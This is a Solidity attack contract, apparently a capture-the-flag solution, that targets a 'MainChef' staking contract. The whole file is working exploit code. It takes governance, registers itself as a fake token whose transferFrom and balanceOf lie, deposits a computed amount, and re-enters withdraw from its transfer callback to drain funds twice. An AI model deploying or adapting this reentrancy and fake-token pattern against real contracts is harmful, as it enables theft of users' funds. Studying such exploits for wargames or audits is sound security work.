import "../levels/MainChef.sol";
import "hardhat/console.sol";

contract MainChefAttack {
    uint pwned;
    uint tradeId;
    MainChef target;

    constructor(MainChef _target) public {
        target = _target;
        pwned = 0;
    }

    function prepare() public {
        target.setGovernance(address(this));
        target.addToken(IERC20(address(this)));
        target.deposit(1, 500010319375738048); // (31333333337 + 313337) / 2 * 1e12 / 31333
    }

    function hack() public {
        target.withdraw(1);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        return true;
    }

    function balanceOf(address a) external returns (uint) {
        return 1e18;
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
      if(pwned != 0) return true;
      pwned += 1;
      target.withdraw(1);
      return true;
    }
}
